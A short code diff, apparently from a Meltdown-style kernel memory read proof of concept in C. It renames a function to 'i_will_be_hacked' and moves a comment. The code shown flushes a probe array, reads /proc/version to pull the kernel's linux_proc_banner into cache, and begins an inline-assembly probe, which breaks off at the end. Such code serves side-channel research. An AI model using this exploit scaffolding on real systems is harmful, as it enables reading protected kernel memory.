@@ -35,7 +35,7 @@ static void clflush_probe_array(void)
 		_mm_clflush(&probe_pages[i * PAGE_SIZE]);
 }
 
-static void i_will_access_kernel_address()//read linux_proc_banner by system call
+static void i_will_be_hacked()
 {
     static char buf[256];
     int fd = open("/proc/version", O_RDONLY);
@@ -44,7 +44,7 @@ static void i_will_access_kernel_address()//read linux_proc_banner by system cal
 		return;
 	}
     
-    if (pread(fd, buf, sizeof(buf), 0) < 0)
+    if (pread(fd, buf, sizeof(buf), 0) < 0)//will read linux_proc_banner by system call
         perror("pread");
     
     close(fd);
@@ -54,7 +54,7 @@ extern char stop_probe[];
 static void __attribute__((noinline)) probe(unsigned long addr)
 {
     //make kernel data(linux_proc_banner) in cache.
-    i_will_access_kernel_address();
+    i_will_be_hacked();
     
 	asm volatile (
 		"1:\n\t"
